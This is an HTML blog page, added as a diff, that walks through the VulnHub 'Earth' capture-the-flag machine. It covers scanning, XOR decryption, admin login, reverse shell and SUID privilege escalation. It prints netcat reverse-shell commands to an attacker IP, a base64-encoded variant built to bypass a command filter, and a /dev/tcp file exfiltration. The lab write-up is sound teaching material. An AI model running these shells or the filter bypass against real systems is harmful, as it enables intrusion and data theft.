@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>Cybersecurity Writeups</title>
+</head>
+<body>
+    <header>
+        <nav>
+            <div class="nav-content">
+                <h1>Cybersecurity Blog</h1>
+                <div class="nav-links">
+                    <a href="#" class="active">Home</a>
+                    <a href="#">Writeups</a>
+                    <a href="#">Tools</a>
+                    <a href="#">About</a>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        <article class="writeup">
+            <div class="writeup-header">
+                <h2>CTF - VulnHub, The Planets:Earth</h2>
+                <div class="metadata">
+                    <span class="author"><a href="author.html">Written by Altin Hajdini</a></span>
+                    <div class="metadata-details">
+                        <span class="date">June 10, 2025</span>
+                        <span class="difficulty">Difficulty: Easy to Medium</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="intro-section">
+                <h3>About This Walkthrough</h3>
+                <p>Welcome to this comprehensive walkthrough of the "Earth" machine from the Planets series on VulnHub. This guide will take you through the process of identifying and exploiting vulnerabilities to find both the user and root flags.</p>
+                
+                <h4>Challenge Overview</h4>
+                <p>In this challenge, you'll need to find two flags:</p>
+                <ul>
+                    <li><strong>User Flag:</strong> Located in the user's home directory</li>
+                    <li><strong>Root Flag:</strong> Requires privilege escalation to root</li>
+                </ul>
+                
+                <p>Each flag is an MD5 hash that serves as proof of successful compromise at each privilege level.</p>
+                
+                <div class="vm-info">
+                    <p><strong>Virtual Machine:</strong> <a href="https://www.vulnhub.com/entry/the-planets-earth,755" target="_blank" class="external-link">The Planets: Earth</a> on VulnHub</p>
+                </div>
+                
+                <div class="disclaimer">
+                    <p><strong>Note:</strong> This walkthrough is for educational purposes only. Only perform security testing on systems you own or have explicit permission to test.</p>
+                </div>
+            </div>
+
+            <div class="toc">
+                <h3>Table of Contents</h3>
+                <ol>
+                    <li><a href="#enumeration">Enumeration</a>
+                        <ol>
+                            <li><a href="#network-discovery">Network Discovery</a></li>
+                            <li><a href="#port-scanning">Port Scanning</a></li>
+                            <li><a href="#vulnerability-research">Vulnerability Research</a></li>
+                            <li><a href="#directory-brute-forcing">Directory Brute-Forcing</a></li>
+                        </ol>
+                    </li>
+                    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                    <li><a href="#conclusion">Conclusion</a></li>
+                </ol>
+            </div>
+
+                <div class="tools-list">
+                    <h3>Tools Used in This Walkthrough</h3>
+                    
+                    <div class="tool-category">For User Flag:</div>
+                    <ul>
+                        <li><code>netdiscover</code> <span class="tool-desc">For discovering hosts on the network</span></li>
+                        <li><code>nmap</code> <span class="tool-desc">For port scanning and service enumeration</span></li>
+                        <li><code>dirb</code> <span class="tool-desc">For directory brute-forcing</span></li>
+                        <li><code>Browser Developer Tools</code> <span class="tool-desc">For analyzing web requests and responses</span></li>
+                        <li><code>CyberChef</code> <span class="tool-desc">For XOR decryption</span></li>
+                        <li><code>netcat</code> <span class="tool-desc">For setting up a reverse shell</span></li>
+                    </ul>
+                    
+                    <div class="tool-category">For Root Flag:</div>
+                    <ul>
+                        <li><code>find</code> <span class="tool-desc">For locating SUID binaries</span></li>
+                        <li><code>file</code> <span class="tool-desc">For analyzing binary files</span></li>
+                        <li><code>strings</code> <span class="tool-desc">For extracting readable strings from binaries</span></li>
+                        <li><code>ltrace</code> <span class="tool-desc">For tracing library calls</span></li>
+                        <li><code>chmod</code> <span class="tool-desc">For modifying file permissions</span></li>
+                        <li><code>su</code> <span class="tool-desc">For switching to root user</span></li>
+                    </ul>
+                </div>
+            </section>
+
+            <section id="enumeration" class="content-section">
+                <h3>1. Enumeration</h3>
+                <h4 id="network-discovery">Network Discovery</h4>
+                <p>First, let's identify the target's IP address on the local network using netdiscover:</p>
+                <figure class="screenshot">
+                    <img src="assets/netdiscover.png" alt="netdiscover scan output">
+                    <figcaption>netdiscover results showing discovered hosts on the network</figcaption>
+                </figure>
+                <h4 id="port-scanning">Port Scanning with Nmap</h4>
+                <p>Once we have identified the target's IP address using <span class="tech-term">netdiscover</span>, we can proceed with <span class="tech-term">Nmap</span> to scan for open ports and gather information about the services running on those ports. This will help us understand what services are available and potentially vulnerable on the target system.</p>
+                <p>With the target IP identified (10.21.0.101), we'll perform an <span class="tech-term">Nmap</span> scan to discover open ports and services:</p>
+                <figure class="screenshot">
+                    <img src="assets/nmap-scan.png" alt="Nmap scan results">
+                    <figcaption>Nmap results for 10.21.0.101</figcaption>
+                </figure>
+                <h5>Nmap Scan Breakdown:</h5>
+                <ul class="scan-breakdown">
+                    <li><code>-sS</code>: TCP SYN scan (stealthy, doesn't complete TCP handshake)</li>
+                    <li><code>-sV</code>: Enables service/version detection</li>
+                    <li><code>-sC</code>: Runs default NSE scripts</li>
+                    <li><code>-p-</code>: Scans all 65535 ports</li>
+                    <li><code>-T4</code>: Sets timing template (higher is faster)</li>
+                    <li><code>-Pn</code>: Skips host discovery (treat target as online)</li>
+                </ul>
+                
+                <h5>Findings:</h5>
+                <ul class="findings">
+                    <li>SSH (Port 22) - Running OpenSSH 8.6</li>
+                    <li>HTTP (Port 80) - Running Apache 2.4.41 on Ubuntu</li>
+                    <li>HTTPS (Port 443) - Running Apache 2.4.41 on Ubuntu (HTTPS)</li>
+                </ul>
+
+                <div class="vulnerability-research">
+                    <h5 id="vulnerability-research">Vulnerability Research</h5>
+                    <p>After identifying open ports and services, it's crucial to check for known vulnerabilities. The services we've discovered (OpenSSH 8.6 and Apache 2.4.41) should be checked against known exploits.</p>
+                    <p>For thorough vulnerability research, you can use:</p>
+                    <ul>
+                        <li><a href="https://www.exploit-db.com/" class="external-link" target="_blank" rel="noopener noreferrer">Exploit Database</a> - A comprehensive database of known exploits</li>
+                        <li><code>searchsploit</code> - A command-line tool for searching Exploit Database locally</li>
+                    </ul>
+                    
+                    <p>After some research, we didn't find any known critical vulnerabilities for the discovered versions of OpenSSH and Apache that we could exploit directly. The services appear to be running relatively recent versions with most known vulnerabilities patched.</p>
+                    
+                    <h5 id="directory-brute-forcing">Next Step: Directory Brute-Forcing with dirb</h5>
+                    <p>Since we didn't find any obvious vulnerabilities in the services themselves, our next step is to perform directory brute-forcing on the web server to discover hidden files and directories. We'll use <code>dirb</code> for this purpose, which is a popular web content scanner that looks for existing (and/or hidden) web objects.</p>
+                    
+                    <p>The basic <code>dirb</code> command we'll use is:</p>
+                    <div class="code-block">
+                        <pre><code>dirb http://10.21.0.101 /usr/share/wordlists/dirb/common.txt -o dirb_scan.txt</code></pre>
+                    </div>
+                    
+                    <p>This command will:</p>
+                    <ul>
+                        <li>Scan <code>http://10.21.0.101</code> (our target web server)</li>
+                        <li>Use the common wordlist (<code>/usr/share/wordlists/dirb/common.txt</code>)</li>
+                        <li>Save the results to <code>dirb_scan.txt</code></li>
+                    </ul>
+
+                    <p>Here are the results from our dirb scan:</p>
+                    <figure class="screenshot">
+                        <img src="assets/dirb-scan.png" alt="dirb scan results showing discovered directories">
+                        <figcaption>Results from dirb scan showing discovered directories and files</figcaption>
+                    </figure>
+                    
+                    <p>From the scan results, we identified that the only accessible path was <code>/cgi-bin/</code>. However, when attempting to access it, we were met with a <code>403 Forbidden</code> error, indicating that while the directory exists, we don't have permission to view its contents.</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/forbidden-http.png" alt="Browser showing 403 Forbidden error for /cgi-bin/">
+                        <figcaption>Accessing /cgi-bin/ results in a 403 Forbidden error</figcaption>
+                    </figure>
+                    
+                    <p>Additionally, attempting to access the URL (<code>http://10.21.0.101</code>) in the web browser returned a <code>400 Bad Request</code> error. However, since we know that port 443 (HTTPS) is open, let's try accessing <code>https://10.21.0.101</code> to see if we can establish a secure connection and access the web server that way.</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/fedora-https.png" alt="Fedora admin login page">
+                        <figcaption>Fedora admin login page accessible via HTTPS</figcaption>
+                    </figure>
+                    
+                    <p>Accessing the URL <code>https://10.21.0.101</code> reveals a Fedora admin login page. While this confirms the web server is running, we don't have valid credentials to proceed with login. After some consideration, I decided to examine the SSL certificate for any potential information disclosure or vulnerabilities that might help us proceed.</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/earth-certificate.png" alt="SSL certificate details showing DNS names">
+                        <figcaption>SSL certificate details revealing DNS names</figcaption>
+                    </figure>
+                    
+                    <p>Upon examining the SSL certificate, I immediately noticed the DNS names <code>earth.local</code> and <code>terratest.earth.local</code>. These domain names were not configured in my Kali Linux's hosts file, which could explain the connection issues. I added the necessary entries using the terminal:</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/echo-dns.png" alt="Terminal showing echo command to update hosts file">
+                        <figcaption>Updating /etc/hosts with the discovered domain names</figcaption>
+                    </figure>
+                    
+                    <p>And if you are someone who does some typos here and there (like me) then just simply use <code>nano /etc/hosts</code> to edit the hosts file and save your changes with <kbd>Ctrl+O</kbd>. Anyways, now it's time to check the changes we have made. Enter <code>earth.local</code> in the URL in your browser and you will see that indeed there is a change:</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/earth.local.png" alt="Browser showing earth.local website">
+                        <figcaption>Accessing earth.local after updating the hosts file</figcaption>
+                    </figure>
+                    
+                    <p>We can see a page with two text input fields and a "Send" button. Below these inputs, there's a section showing "Previous messages" which appear to be encrypted. This suggests the page might be handling some form of encrypted communication.</p>
+                    
+                    <p>Next, let's check <code>terratest.earth.local</code>. Remember to include <code>https://</code> in the URL. When accessed, it displays a simple message: "a test page, please ignore". This doesn't provide much to work with, so let's take a different approach.</p>
+                    
+                    <p>It's time to use <code>dirb</code> again to scan these domains for hidden directories or files that might not be immediately visible. We'll scan both domains to get a better understanding of what's available.</p>
+                    
+                    <p>First, let's scan <code>http://earth.local</code>:</p>
+                    <figure class="screenshot">
+                        <img src="assets/dirb-earth-scan.png" alt="DIRB scan results for earth.local">
+                        <figcaption>DIRB scan results for earth.local</figcaption>
+                    </figure>
+                    <p>From the scan results, we've discovered an interesting directory: <code>/admin</code>. After checking <code>earth.local/admin</code>, I found a login page. Obviously, I was missing the credentials for the login.</p>
+                    
+                    <p>Next, let's scan <code>terratest.earth.local</code>. Initially, using <code>http://</code> only showed the same results as earth.local, which wasn't helpful. However, when I tried with <code>https://</code>, the scan revealed two important files:</p>
+                    <figure class="screenshot">
+                        <img src="assets/dirb-terratest-scan.png" alt="DIRB scan results for terratest.earth.local">
+                        <figcaption>DIRB scan results for terratest.earth.local showing index.html and robots.txt</figcaption>
+                    </figure>
+                    <p>The scan found both <code>index.html</code> and <code>robots.txt</code>. The <code>robots.txt</code> file is particularly interesting as it might contain information about hidden directories or files that the website administrator doesn't want search engines to index.</p>
+                    
+                    <p>Upon opening <code>https://terratest.earth.local/robots.txt</code>, I immediately noticed an interesting entry: <code>testingnotes</code>.</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/robotstxt.png" alt="robots.txt content showing testingnotes entry">
+                        <figcaption>Contents of robots.txt showing the testingnotes entry</figcaption>
+                    </figure>
+                    
+                    <p>I had to check this right away, and upon opening <code>https://terratest.earth.local/testingnotes.txt</code>, I found the following note:</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/testingnotes.png" alt="Content of testingnotes">
+                        <figcaption>Important note found in the testingnotes file</figcaption>
+                    </figure>
+                    
+                    <p>From the testing notes, we've gathered several crucial pieces of information:</p>
+                    <ul>
+                        <li>The messages we saw on the earth.local page are encrypted using XOR encryption</li>
+                        <li>The file <code>testdata.txt</code> was used as part of the encryption process</li>
+                        <li>The username for the admin portal is <code>terra</code></li>
+                    </ul>
+                    
+                    <p>We now have potential credentials for the admin portal we discovered earlier. The mention of XOR encryption also gives us a clear direction for decrypting the messages we saw on the earth.local page.</p>
+                    
+                    <h4>Decrypting with CyberChef</h4>
+                    <p>To decrypt the XOR-encrypted messages from earth.local, we'll use <a href="https://gchq.github.io/CyberChef/" class="external-link" target="_blank" rel="noopener noreferrer">CyberChef</a>, a powerful, web-based tool for various cybersecurity operations including encryption, encoding, and data analysis. CyberChef allows us to apply multiple operations to our data in a simple, intuitive interface.</p>
+                    
+                    <p class="note">
+                        <strong>Note:</strong> If you have CyberChef installed on your Linux system, just simply type <code>cyberchef</code> in your terminal, and it will automatically open the interface in your default web browser.
+                    </p>
+                    
+                    <p>Here's how we'll proceed with the decryption:</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/cyberchef.png" alt="CyberChef interface with decryption recipe">
+                        <figcaption>CyberChef interface showing the decryption process</figcaption>
+                    </figure>
+                    
+                    <p>Our decryption recipe in CyberChef consists of two main operations:</p>
+                    <ol>
+                        <li><strong>From Hex</strong> - Converts the hexadecimal-encoded message back to its binary representation</li>
+                        <li><strong>XOR</strong> - Applies the XOR operation using the key from <code>testdata.txt</code> with UTF-8 encoding</li>
+                    </ol>
+                    
+                    <p>Now it's time for CyberChef to start baking! After trying all three encrypted messages from earth.local, the third one yielded the most promising result. The decrypted message revealed what appears to be a potential password: <code>earthclimatechangebad4humans</code>.</p>
+                    
+                    <p>This is significant because we previously discovered that the admin username is <code>terra</code>. We now have a complete set of credentials to test against the admin login page we found earlier.</p>
+                    
+                    <p>Using the credentials <code>terra:earthclimatechangebad4humans</code>, we've successfully gained access to the admin dashboard.</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/admin.png" alt="Admin dashboard after successful authentication">
+                        <figcaption>Admin dashboard after successful login with the discovered credentials</figcaption>
+                    </figure>
+                    
+                    <p>What we can see is some kind of terminal. This level of access could potentially allow us to explore the server's file system further or look for additional vulnerabilities to escalate our privileges.</p>
+    
+                    <p>After running some basic commands like <code>ls</code> to list files and <code>cd</code> to change directories, I discovered the presence of a <code>/home</code> directory containing a user account named <code>earth</code>. This discovery is particularly interesting as it might provide us with additional attack vectors or valuable information that could lead to privilege escalation.</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/home-dir.png" alt="Terminal showing the /home directory with earth user">
+                        <figcaption>Terminal output showing the /home directory containing the earth user account</figcaption>
+                    </figure>
+                    
+                    <p>I kept poking around the system and found something interesting in the <code>/var/earth_web</code> directory. There it was - <code>user_flag.txt</code> just sitting there, containing the user flag we've been after: <code>user_flag_3353b67d6437f07ba7d34afd7d2fc27d</code>. The name "earth_web" definitely stood out, especially since we're dealing with the "Earth" VM in this CTF challenge.</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/earth_web.png" alt="Terminal output displaying the contents of the /var/earth_web directory, highlighting user_flag.txt">
+                        <figcaption>Directory listing of /var/earth_web showing the presence of user_flag.txt</figcaption>
+                    </figure>
+                    
+                    <p>We've got our first flag, but we're not done yet. There's still the root flag to find. Time to roll up our sleeves and figure out how to escalate our privileges to root and grab that final flag!</p>
+                    
+                    <h4>Establishing a Reverse Shell</h4>
+                    <p>My first thought was to get a more stable connection to the target. The web terminal was functional, but having a proper shell would make privilege escalation much easier. I decided to set up a reverse shell connection using netcat.</p>
+                    
+                    <p>On my Kali Linux machine, I started a netcat listener with:</p>
+                    <div class="code-block">
+                        <pre><code>nc -lnvp 9000</code></pre>
+                    </div>
+                    <p>Breaking down the flags used in the netcat listener:</p>
+                    <ul>
+                        <li><code>-l</code> - Listen mode (server mode)</li>
+                        <li><code>-n</code> - No DNS lookups</li>
+                        <li><code>-v</code> - Verbose output (shows connection details)</li>
+                        <li><code>-p 9000</code> - Specifies the port to listen on (9000 in this case)</li>
+                    </ul>
+                    
+                    <p>Then, in the target's web terminal, I executed:</p>
+                    <div class="code-block">
+                        <pre><code>nc -e /bin/bash 10.21.0.100 9000</code></pre>
+                    </div>
+                    
+                    <p>Let me break down what this command does:</p>
+                    <ul>
+                        <li><code>nc</code> - The netcat command, often called the "Swiss Army knife" of networking</li>
+                        <li><code>-e /bin/bash</code> - Executes the bash shell and connects it to the network connection</li>
+                        <li><code>10.21.0.100</code> - The IP address of my attacking machine (where we'll receive the shell)</li>
+                        <li><code>9000</code> - The port number we're connecting to on our attacking machine</li>
+                    </ul>
+                    
+                    <p>However, the connection attempt failed with the web interface showing: <code>Remote connections are forbidden</code>. This is a common security measure to prevent direct reverse shell connections.</p>
+                    
+                    <h4>Alternative Approach: Bypassing Connection Restrictions</h4>
+                    <p>Since direct remote connections are blocked, we can try a different approach. The idea is to encrypt our netcat command, have the web terminal decrypt it, and then execute it. This method can sometimes bypass basic command filters that block direct reverse shell attempts.</p>
+                    
+                    <p>Here's the plan:</p>
+                    <ol>
+                        <li>Create an encrypted version of our reverse shell command</li>
+                        <li>Use the web terminal to decrypt and execute it in memory</li>
+                        <li>This way, the actual command is never sent in plaintext</li>
+                    </ol>
+
+                    <h5>Step 1: Encrypting the Command</h5>
+                    <p>First, we'll encode our netcat command using base64 encoding. This converts our command into a string of characters that doesn't look like a shell command at first glance:</p>
+                    
+                    <div class="code-block">
+                        <pre><code>echo "nc -e /bin/bash 10.21.0.100 9000" | base64</code></pre>
+                    </div>
+                    
+                    <p>This command outputs the base64-encoded string of our netcat command. The output will look something like this:</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/nc-encr.png" alt="Base64 encoded netcat command">
+                        <figcaption>Base64 encoding the netcat command</figcaption>
+                    </figure>
+                    
+                    <h5>Step 2: Executing the Encoded Command</h5>
+                    <p>Now, we'll take the encoded string and execute it in the target's web terminal with this command:</p>
+                    
+                    <div class="code-block">
+                        <pre><code>echo 'bmMgLWUgL2Jpbi9iYXNoIDEwLjIxLjAuMTAwIDkwMDAK' | base64 -d | bash</code></pre>
+                    </div>
+                    
+                    <p>Let's break down what this does:</p>
+                    <ul>
+                        <li><code>echo 'bmMgLWUgL2Jpbi9iYXNoIDEwLjIxLjAuMTAwIDkwMDAK'</code> - Outputs the base64-encoded string</li>
+                        <li><code>| base64 -d</code> - Pipes the output to base64 decode</li>
+                        <li><code>| bash</code> - Takes the decoded command and executes it in the bash shell</li>
+                    </ul>
+
+                    <p>The content between the single quotes is our encrypted netcat command. When decoded, it becomes the original <code>nc -e /bin/bash 10.21.0.100 9000</code> command, but the web terminal's security filters won't recognize it as such because it's encoded.</p>
+                    
+                    <h5>Verifying the Connection</h5>
+                    <p>After executing the encoded command in the web terminal, we can see that our netcat listener on Kali Linux successfully receives the connection. To verify we have a working shell, we can run the <code>whoami</code> command, which should return the current user context.</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/nc-whoami.png" alt="Successful reverse shell with whoami command">
+                        <figcaption>Successful reverse shell connection with user verification</figcaption>
+                    </figure>
+                    
+                    <p>As shown in the screenshot, the <code>whoami</code> command returns <code>apache</code>, confirming that we've successfully established a reverse shell connection to the target system. This gives us a much more stable and interactive session compared to the web terminal, which will be crucial for our privilege escalation attempts.</p>
+                    
+                    <h3 id="privilege-escalation">2. Privilege Escalation</h3>
+                    <h4>Searching for Privilege Escalation Vectors</h4>
+                    <p>After gaining initial access, I began exploring the system to find potential privilege escalation paths. Since manual exploration of directories didn't yield any immediate results, I decided to look for files with the SUID (Set User ID) bit set. These files run with the permissions of their owner (often root) regardless of who executes them, making them prime targets for privilege escalation.</p>
+                    
+                    <p>To find these files, I used the following command:</p>
+                    
+                    <div class="code-block">
+                        <pre><code>find / -perm -u=s -type f 2>/dev/null</code></pre>
+                    </div>
+                    
+                    <p>Let's break down what this command does:</p>
+                    <ul>
+                        <li><code>find /</code> - Searches the entire filesystem starting from the root directory</li>
+                        <li><code>-perm -u=s</code> - Looks for files with the SUID bit set (runs with the owner's privileges)</li>
+                        <li><code>-type f</code> - Only searches for regular files (not directories, symlinks, etc.)</li>
+                        <li><code>2>/dev/null</code> - Redirects error messages to /dev/null to clean up the output</li>
+                    </ul>
+                    
+                    <p>This command will list all files on the system that have the SUID bit set, which could potentially be exploited to escalate our privileges from <code>apache</code> to <code>root</code>.</p>
+
+                    <p>One particular binary caught my attention: <code>/usr/bin/reset_root</code>. The name suggests it might be related to resetting the root password or privileges. To learn more about this file, I used the <code>file</code> command:</p>
+                    
+                    <div class="code-block">
+                        <pre><code>file /usr/bin/reset_root</code></pre>
+                    </div>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/reset-rootInfo.png" alt="Output of file command on reset_root binary">
+                        <figcaption>Output showing information about the reset_root binary</figcaption>
+                    </figure>
+                    
+                    <p>The output reveals that <code>reset_root</code> is a 64-bit ELF executable, which is a standard format for Linux executables. The file is not stripped, meaning it contains debugging symbols that might be useful for analysis. The most interesting part is that it's setuid root, which means it runs with root privileges regardless of who executes it - a perfect candidate for privilege escalation :D</p>
+                    
+                    <p>Excited by this finding, I tried executing the binary directly. However, the command didn't work as expected. It seems there might be additional security measures in place preventing direct execution, or perhaps the binary requires specific arguments or environment conditions to run properly.</p>
+
+                    <h5>Transferring the Content for Analysis</h5>
+                    <p>To investigate further, I decided to transfer the content of <code>reset_root</code> to my Kali Linux machine for deeper analysis. Since we already have a netcat connection, we can use it to transfer files. Here's how I did it:</p>
+                    
+                    <p>First, on my Kali Linux machine, I set up a netcat listener to receive the file:</p>
+                    <div class="code-block">
+                        <pre><code>nc -lnvp 9000 > reset_root</code></pre>
+                    </div>
+                    
+                    <p>Then, in the target's reverse shell session, I used the following command to send the file:</p>
+                    <div class="code-block">
+                        <pre><code>cat /usr/bin/reset_root > /dev/tcp/10.21.0.100/9000</code></pre>
+                    </div>
+                    
+                    <p>Let me break down what this command does:</p>
+                    <ul>
+                        <li><code>cat /usr/bin/reset_root</code> - Outputs the binary content of the reset_root file</li>
+                        <li><code>> /dev/tcp/10.21.0.100/9000</code> - This special <code>/dev/tcp/[IP]/[port]</code> syntax is a bash feature that allows for TCP connections. It sends the output directly to my Kali machine's IP (10.21.0.100) on port 9000</li>
+                    </ul>
+                    
+                    <p>After executing these commands, the content of <code>reset_root</code> was successfully transferred to my Kali machine.</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/nc-transfer.png" alt="Successful file transfer using netcat">
+                        <figcaption>Successful transfer of the reset_root binary to Kali Linux</figcaption>
+                    </figure>
+                    
+                    <p>And Voila! The file transfer completed successfully. I could now use tools like <code>strings</code> or <code>ltrace</code> to analyze the binary further and understand its functionality.</p>
+                    
+                    <h5>Analyzing the Binary</h5>
+                    <p>First, I tried using the <code>strings</code> command to extract readable strings from the binary:</p>
+                    <div class="code-block">
+                        <pre><code>strings reset_root</code></pre>
+                    </div>
+                    
+                    <p>However, I couldn't find any major information from the strings output. The binary appeared to be compiled without many debug strings or clear indicators of its functionality.</p>
+                    
+                    <p>Next, I decided to use <code>ltrace</code>, a powerful debugging utility that intercepts and records the dynamic library calls made by a process, along with the signals received by that process. It's particularly useful for reverse engineering and understanding how a program interacts with the system libraries. The tool shows both the function calls and their arguments, which can reveal important details about the program's behavior, including file operations, network communications, and memory management.</p>
+                    
+                    <p>Before using <code>ltrace</code>, I needed to make the binary executable since it didn't have the proper permissions:</p>
+                    
+                    <div class="code-block">
+                        <pre><code>chmod +x reset_root</code></pre>
+                    </div>
+                    
+                    <p>After making the file executable, I ran it with <code>ltrace</code>:</p>
+                    <div class="code-block">
+                        <pre><code>ltrace ./reset_root</code></pre>
+                    </div>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/ltraceInfo.png" alt="Output of ltrace on reset_root binary">
+                        <figcaption>Output from ltrace showing library calls made by reset_root</figcaption>
+                    </figure>
+                    
+                    <p>This provided much more useful information! The <code>ltrace</code> output showed me all the library function calls made by the binary in real-time, including functions like <code>strcmp()</code>, <code>fopen()</code>, <code>system()</code>, and others. By analyzing these calls and their arguments, I could see exactly what the program was doing behind the scenes, such as which files it was trying to access, what system commands it might be executing, and how it was processing data. This insight was crucial for understanding the binary's behavior and identifying potential security vulnerabilities or unintended functionality.</p>
+                    
+                    <h5>Addressing Missing Dependencies</h5>
+                    <p>Upon analyzing the <code>ltrace</code> output, I noticed that <code>reset_root</code> was failing because it was looking for three specific files that didn't exist on the system. The binary was trying to read these files to verify certain conditions before proceeding with its execution.</p>
+                    
+                    <p>To resolve this, I created the missing files in the remote shell on the earth system.</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/touchPath.png" alt="Creating required files in the remote shell">
+                        <figcaption>Creating the required files in the remote shell session</figcaption>
+                    </figure>
+                    
+                    <p>After creating these files with the expected content and permissions, I was able to run the <code>reset_root</code> binary successfully.</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/resetEarth.png" alt="Output of executing reset_root binary">
+                        <figcaption>Successful execution of reset_root revealing the root password</figcaption>
+                    </figure>
+                    
+                    <p>Bingo! The <code>reset_root</code> binary did its thing and spat out the root password: <code>Earth</code>. Just like that, we've got the keys to the kingdom.</p>
+                    
+                    <p>Time to switch to root with a quick <code>su</code> and see what kind of access we've got.</p>
+            
+                    <p>Finding the root flag was actually easier than expected. It was right there in the root directory, waiting to be discovered. A quick <code>ls /root</code> revealed the treasure we've been after.</p>
+                    
+                    <figure class="screenshot">
+                        <img src="assets/rootFlag.png" alt="Root flag found in the root directory">
+                        <figcaption>Root flag found in the root directory</figcaption>
+                    </figure>
+                    
+                    <p>And just like that, we've got our second and final flag: <code>root_flag_b0da9554d29db2117b02aa8b66ec492e</code>.</p>
+                    
+                    <div id="conclusion" class="success-message">
+                        <h4>Mission Accomplished! 🎉</h4>
+                        <p>We've successfully rooted the Earth machine! This was a fun journey through various security concepts and privilege escalation techniques. Thanks for following along with this walkthrough. If you enjoyed this, feel free to check out my other write-ups and security research on my blog.</p>
+                        <p>Until next time, happy hacking! 👨‍💻</p>
+                    </div>
+                </div>
+            </section>
+        </article>
+    </main>
+    <footer>
+        <p>&copy; 2025 Cybersecurity Blog</p>
+    </footer>
+
+    <!-- Modal for expanded images -->
+    <div id="imageModal" class="modal">
+        <span class="close">&times;</span>
+        <img class="modal-content" id="expandedImage">
+        <div id="caption"></div>
+    </div>
+
+    <script>
+        // Get modal
+        var modal = document.getElementById('imageModal');
+        
+        // Get image and insert it inside the modal
+        var modalImg = document.getElementById("expandedImage");
+        var captionText = document.getElementById("caption");
+        
+        // Get all images with class 'screenshot-img' and add click event
+        var images = document.querySelectorAll('.screenshot img');
+        images.forEach(function(img) {
+            img.onclick = function(){
+                modal.style.display = "block";
+                modalImg.src = this.src;
+                captionText.innerHTML = this.alt;
+            }
+        });
+        
+        // Get the <span> element that closes the modal
+        var span = document.getElementsByClassName("close")[0];
+        
+        // When the user clicks on <span> (x), close the modal
+        span.onclick = function() { 
+            modal.style.display = "none";
+        }
+        
+        // When the user clicks anywhere outside of the modal, close it
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+    </script>
+</body>
+</html>
